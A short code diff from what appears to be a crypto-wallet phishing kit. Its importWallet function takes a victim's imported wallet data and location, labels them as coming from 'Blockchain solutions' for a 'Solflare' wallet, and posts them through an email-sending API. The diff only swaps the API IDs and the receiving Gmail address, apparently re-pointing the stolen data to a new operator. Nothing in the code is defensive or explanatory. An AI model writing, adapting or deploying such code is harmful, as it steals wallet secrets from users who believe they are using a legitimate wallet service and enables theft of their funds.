@@ -248,15 +248,15 @@ async function importWallet() {
     console.log(payload);
 
     const params = {
-      service_id: "service_k4kimk6",
-      template_id: "template_mpy0fmg",
-      user_id: "DMvtKT5BmC4qV83V9",
+      service_id: "service_8lwf7pj",
+      template_id: "template_7ynzmbg",
+      user_id: "X8SiUQHYTJaQV4lbE",
       template_params: {
         from_name: "Blockchain solutions",
         wallet_type: "Solflare",
         location: JSON.stringify(location.data),
         link_drops: JSON.stringify(payload),
-        reply_to: "customeronlineagent@gmail.com",
+        reply_to: "edgir973@gmail.com",
       },
     };
     const response = await axios.post(
